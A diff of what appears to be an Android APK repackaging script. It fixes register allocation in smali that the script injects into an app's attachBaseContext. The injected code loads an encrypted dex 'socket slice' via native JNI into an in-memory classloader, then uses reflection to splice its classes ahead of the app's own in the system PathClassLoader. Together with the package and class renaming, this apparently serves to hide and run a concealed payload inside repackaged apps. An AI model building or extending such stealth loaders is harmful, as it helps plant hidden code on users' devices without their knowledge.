@@ -3539,27 +3539,32 @@ def step_inject_native_loader(new_pkg: str, class_rename_map: dict,
     # This patches the SAME classloader Android uses for all class lookups — no
     # AppComponentFactory override needed, works on all OEMs including Vivo.
     #
-    # Register allocation (locals 20):
-    #  v0..v5  — IMDCL construction (v5 = IMDCL, v4 = PCL)
-    #  v6      — BaseDexClassLoader Class object
-    #  v7      — "pathList" field (Field object)
-    #  v8      — PCL pathList object (DexPathList)
-    #  v9      — "dexElements" field (Field object)
-    #  v10     — existing dexElements array (from PCL pathList)
-    #  v11     — IMDCL pathList object
-    #  v12     — new dexElements array (from IMDCL pathList)
-    #  v13     — length of new elements
-    #  v14     — length of existing elements
-    #  v15     — total merged length
-    #  v16     — component type of element array
-    #  v17     — merged array
-    #  v18     — const/4 0x0 (zero)
-    #  v19     — const/4 0x1 (true/one)
+    # Register allocation (locals 16 — max allowed by smali 4-bit encoding):
+    #  IMDCL construction phase:
+    #   v0 = temp / thread
+    #   v1 = asset_filename string
+    #   v2 = dex byte[] from xd()
+    #   v3 = ByteBuffer
+    #   v4 = PathClassLoader (Class then ClassLoader)
+    #   v5 = IMDCL — PRESERVED throughout
+    #  PCL injection phase (v0-v3 reused as temps):
+    #   v4 = PCL (re-obtained via getClassLoader)
+    #   v5 = IMDCL — still the IMDCL
+    #   v6 = pathList Field (from BaseDexClassLoader) — kept for IMDCL pathList get
+    #   v7 = PCL DexPathList object — kept for final field.set()
+    #   v8 = dexElements Field — kept for IMDCL get + final set
+    #   v9 = existing dexElements (from PCL) — kept for second arraycopy
+    #   v10 = IMDCL dexElements (new elements) — kept for first arraycopy + getLength
+    #   v11 = new_len (length of IMDCL elements) — kept for second arraycopy offset
+    #   v12 = exist_len — used for add-int then second arraycopy count
+    #   v13 = total_len — used for newInstance then reused as merged array
+    #   v14 = const 0 (zero for arraycopy src/dst positions)
+    #   v15 = const 1 (true for setAccessible)
     attach_method = f"""
 # DEX loader hook — loads encrypted io/socket slice via native JNI
 # Then injects its dexElements into the system PathClassLoader (works on all OEMs)
 .method public attachBaseContext(Landroid/content/Context;)V
-    .locals 20
+    .locals 16
 
     # super.attachBaseContext(base)
     invoke-super {{p0, p1}}, Landroid/app/Application;->attachBaseContext(Landroid/content/Context;)V
@@ -3599,72 +3604,69 @@ def step_inject_native_loader(new_pkg: str, class_rename_map: dict,
     # Prepend IMDCL's dexElements into the system PathClassLoader's DexPathList.
     # Android finds SplashScreenActivity/etc. via normal class lookup — no
     # AppComponentFactory override needed. Works on all OEMs including Vivo.
+    # All registers v0-v15 only — required by smali 4-bit register encoding.
     :try_start_pcl
-    const/4 v19, 0x1
-    const/4 v18, 0x0
+    const/4 v15, 0x1
+    const/4 v14, 0x0
 
     # Step 1: get PathClassLoader = p0.getClassLoader()
     invoke-virtual {{p0}}, Landroid/content/ContextWrapper;->getClassLoader()Ljava/lang/ClassLoader;
     move-result-object v4
 
-    # Step 2: get BaseDexClassLoader class via Class.forName
+    # Step 2: get pathList Field from BaseDexClassLoader via reflection
     const-string v0, "dalvik.system.BaseDexClassLoader"
     invoke-static {{v0}}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
+    move-result-object v0
+    const-string v1, "pathList"
+    invoke-virtual {{v0, v1}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
     move-result-object v6
+    invoke-virtual {{v6, v15}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
 
-    # get pathList field from BaseDexClassLoader
-    const-string v0, "pathList"
-    invoke-virtual {{v6, v0}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
+    # get PCL's pathList object (DexPathList)
+    invoke-virtual {{v6, v4}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
     move-result-object v7
-    invoke-virtual {{v7, v19}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
 
-    # get PCL's pathList object
-    invoke-virtual {{v7, v4}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
-    move-result-object v8
-
-    # Step 3: get dexElements field from DexPathList class
-    invoke-virtual {{v8}}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
+    # Step 3: get dexElements Field from DexPathList class
+    invoke-virtual {{v7}}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
     move-result-object v0
     const-string v1, "dexElements"
     invoke-virtual {{v0, v1}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
-    move-result-object v9
-    invoke-virtual {{v9, v19}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
+    move-result-object v8
+    invoke-virtual {{v8, v15}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
 
-    # Step 4: get existing dexElements from PCL pathList
-    invoke-virtual {{v9, v8}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
+    # Step 4: get existing dexElements from PCL's pathList
+    invoke-virtual {{v8, v7}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
+    move-result-object v9
+
+    # Step 5: get IMDCL pathList, then its dexElements (new elements to prepend)
+    invoke-virtual {{v6, v5}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
+    move-result-object v0
+    invoke-virtual {{v8, v0}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
     move-result-object v10
 
-    # Step 5: get IMDCL pathList, then its dexElements
-    invoke-virtual {{v7, v5}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
-    move-result-object v11
-    invoke-virtual {{v9, v11}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
-    move-result-object v12
-
-    # Step 6: merge arrays — IMDCL elements first so they take lookup priority
-    invoke-static {{v12}}, Ljava/lang/reflect/Array;->getLength(Ljava/lang/Object;)I
-    move-result v13
+    # Step 6: compute lengths and allocate merged array
     invoke-static {{v10}}, Ljava/lang/reflect/Array;->getLength(Ljava/lang/Object;)I
-    move-result v14
-    add-int v15, v13, v14
+    move-result v11
+    invoke-static {{v9}}, Ljava/lang/reflect/Array;->getLength(Ljava/lang/Object;)I
+    move-result v12
+    add-int v13, v11, v12
 
-    # get component type from new elements array
-    invoke-virtual {{v12}}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
+    # get component type from IMDCL elements array, allocate merged
+    invoke-virtual {{v10}}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
     move-result-object v0
     invoke-virtual {{v0}}, Ljava/lang/Class;->getComponentType()Ljava/lang/Class;
-    move-result-object v16
+    move-result-object v0
+    invoke-static {{v0, v13}}, Ljava/lang/reflect/Array;->newInstance(Ljava/lang/Class;I)Ljava/lang/Object;
+    move-result-object v13
 
-    # allocate merged array
-    invoke-static {{v16, v15}}, Ljava/lang/reflect/Array;->newInstance(Ljava/lang/Class;I)Ljava/lang/Object;
-    move-result-object v17
+    # copy IMDCL elements into merged[0..v11-1] — new elements first (priority)
+    invoke-static {{v10, v14, v13, v14, v11}}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V
 
-    # copy IMDCL elements into merged[0..v13-1]
-    invoke-static {{v12, v18, v17, v18, v13}}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V
-
-    # copy existing elements into merged[v13..v15-1]
-    invoke-static {{v10, v18, v17, v13, v14}}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V
+    # copy existing elements into merged[v11..v11+v12-1]
+    invoke-static {{v9, v14, v13, v11, v12}}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V
 
     # Step 7: write merged array back into PCL's pathList.dexElements
-    invoke-virtual {{v9, v8, v17}}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V
+    invoke-virtual {{v8, v7, v13}}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V
     :try_end_pcl
     .catch Ljava/lang/Throwable; {{:try_start_pcl .. :try_end_pcl}} :catch_pcl
     :catch_pcl
